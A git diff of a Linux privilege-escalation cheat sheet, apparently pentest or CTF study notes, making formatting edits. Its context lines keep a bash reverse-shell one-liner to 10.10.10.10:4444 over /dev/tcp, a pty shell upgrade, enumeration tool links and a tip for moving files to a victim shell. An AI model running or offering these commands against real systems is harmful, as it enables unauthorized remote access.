@@ -1,5 +1,5 @@
 # PrivEscalation
-
+***
 ### Better listener shell experience
 ```python -c 'import pty;pty.spawn("/bin/bash")'``` 
 
@@ -55,7 +55,7 @@ c. sudo program with the LD_LIBRARY_PATH
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1```
 
 
-7. 
+### Automated tools
 LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 LinEnum: https://github.com/rebootuser/LinEnum
 LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
@@ -63,7 +63,8 @@ Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeratio
 Linux Priv Checker: https://github.com/linted/linuxprivchecker
 
 
-# Reverse Shell:
+# Reverse Shell
+***
 1. https://www.revshells.com/
 2. MonkeyPenTest
 3. Start webserver using python "sudo python3 -m http.server 80" then download files from victim shell 
